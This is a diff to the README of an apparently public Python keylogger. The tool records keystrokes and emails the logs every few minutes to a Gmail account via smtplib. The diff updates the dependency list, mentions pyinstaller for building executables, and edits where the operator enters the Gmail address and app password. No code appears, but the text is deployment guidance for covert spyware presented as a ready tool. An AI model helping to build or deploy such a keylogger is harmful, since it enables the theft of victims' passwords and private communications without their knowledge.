@@ -2,21 +2,22 @@
 <img align="right" src="imgs/klggr.png">
 
 ### Keylogger written in Python 3.11 that sends logs to gmail account via smtplib.
-By default keylogger sends all logs every 10 minutes. If nothing is captured after the last email, nothing will be sent as long as the program will detect another key being pressed.
+By default keylogger sends all logs every 5 minutes. If nothing is captured after the last email, nothing will be sent as long as the program will detect another key being pressed.
 
 #### pip requirements: 
-- keyboard from pynput
-- MIMEText from email.mime.text
-- gethostbyname & gethostname from socket
-- system from platform
+- pynput
+- email.mime.text
+- socket
+- platform
+- requests
 - time
 - smtplib
-- pyinstaller (building exe)
+- pyinstaller (building executables)
 
 # Instructions <img align="right" src="imgs/manual.png">
 
 ### 1. Using gmail address and app password in keylogger.
-You need generated gmail app password, just put it inside code of ```main.pyw``` with gmail address into function in line 63.
+You need generated gmail app password, just put it inside code of ```main.pyw``` with email address and app password (at lines 72-74).
 
 ![Image of function](imgs/func.png)
 
